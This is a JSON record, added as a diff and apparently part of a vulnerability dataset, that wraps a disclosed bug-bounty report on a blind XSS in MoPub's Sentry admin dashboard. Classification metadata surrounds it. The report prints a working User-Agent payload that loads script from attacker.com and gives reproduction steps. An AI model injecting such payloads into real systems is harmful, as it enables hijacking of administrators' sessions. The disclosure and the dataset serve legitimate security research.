@@ -1,0 +1,42 @@
+{
+    "reported_to": "X (Formerly Twitter)",
+    "reported_by": "harisec ",
+    "title": "Blind XSS in Mobpub Marketplace Admin Production | Sentry via demand.mopub.com (User-Agent)",
+    "content": "\nSummary:\nI've identified a Blind XSS vulnerability that fires in the Mobpub Marketplace Admin Production | Sentry dashboard and can be triggered by sending a HTTPS request to an endpoint from the domain demand.mopub.com.\nDescription:\nI've sent the following HTTPS request to the following URL https://demand.mopub.com/accounts/login/\nCode 244 Bytes\n1GET /accounts/login/ HTTP/1.1\n2Referer: 1\n3User-Agent: '>\"></title></style></textarea></script><script/src=attacker.com/js></script>\n4X-Forwarded-For: 1\n5Host: demand.mopub.com\n6Accept-Encoding: gzip,deflate\n7Accept: */*\n8X-OrigHost: demand.mopub.com\n9\nPlease note that the value of the User-Agent header is set to an Blind XSS payload (I've used attacker.com/js as an example but initially it was set to an script loaded from my test domain thx.bz.\nSome time later after this initial request I've received two hits and the script from thx.bz was downloaded and executed. The script is configured to extract information from the browser context for demonstration purposes.\nI've extracted the content of the browser DOM (attached to this report as DOM.html) and other interesting information:\nDashboard Page URL\nhttp://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/\nUser IP Address\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nTitle\nMarketplace Admin Production | Sentry\nUser-Agent\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCookies\n\u2588\u2588\u2588\u2588\u2588\u2588\nExecution Origin\nhttp://sentry-test.mopub.com\nIf you open the attachment DOM.html in a browser and search for thx.bz you will see that the value of the User-Agent is reflected inside a <option> tag without proper encoding and it was possible to escape the context and inject an additional SCRIPT tag.\nThe IP address that was used to visit the dashboard is \u2588\u2588\u2588\u2588\u2588\u2588\u2588 and I've verified that it belongs to Twitter.\nSteps To Reproduce:\nSend the following HTTPS request (while replacing attacker.com/js with a domain/URL you control and where you can inspect the web server logs).\nCode 244 Bytes\n1GET /accounts/login/ HTTP/1.1\n2Referer: 1\n3User-Agent: '>\"></title></style></textarea></script><script/src=attacker.com/js></script>\n4X-Forwarded-For: 1\n5Host: demand.mopub.com\n6Accept-Encoding: gzip,deflate\n7Accept: */*\n8X-OrigHost: demand.mopub.com\n9\nLogin into http://sentry-test.mopub.com/ using administrative credentials and visit the vulnerable URL\nhttp://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/.\nAt this point a script should be loaded from your domain (the one you've used instead of attacker.com/js).\nImpact:\nAn attacker can gain access and execute arbitrary JavaScript code in the context of the administrative dashboard Mobpub Marketplace Admin Production | Sentry.\nSupporting Material/References:\nList any additional material (e.g. screenshots, logs, etc.)\nI've attached the contents of browser DOM where the Blind XSS triggered (DOM.html), more information about the execution context bxss-report.html and screenshots from the the browser DOM.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1518866100,
+    "report_url": "https://hackerone.com/reports/275518",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a crafted HTTPS request to https://demand.mopub.com/accounts/login/ with a malicious User-Agent header containing a Blind XSS payload."
+        ],
+        [
+            2,
+            "Wait for an administrator to access the Sentry dashboard (http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/), which triggers the XSS payload."
+        ]
+    ],
+    "vuln_description": "A Blind XSS vulnerability in the Mobpub Marketplace Admin Production | Sentry dashboard allows an attacker to execute arbitrary JavaScript in the context of an administrative session by injecting a malicious payload via the User-Agent header in a request to demand.mopub.com.",
+    "reason": "The attack involves a straightforward injection of a Blind XSS payload into a header, which is a common technique. The complexity is low because it does not require understanding complex application states or novel logic, and the interaction between components (the request and the dashboard) is predictable.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The Blind XSS vulnerability involves injecting a malicious payload via the User-Agent header, which is a different class of vulnerability (client-side injection) than the authN/authZ bypass or IDOR vulnerabilities described in the methodology. The methodology focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting injection points or client-side script execution.",
+        "is_detectable": false
+    }
+}
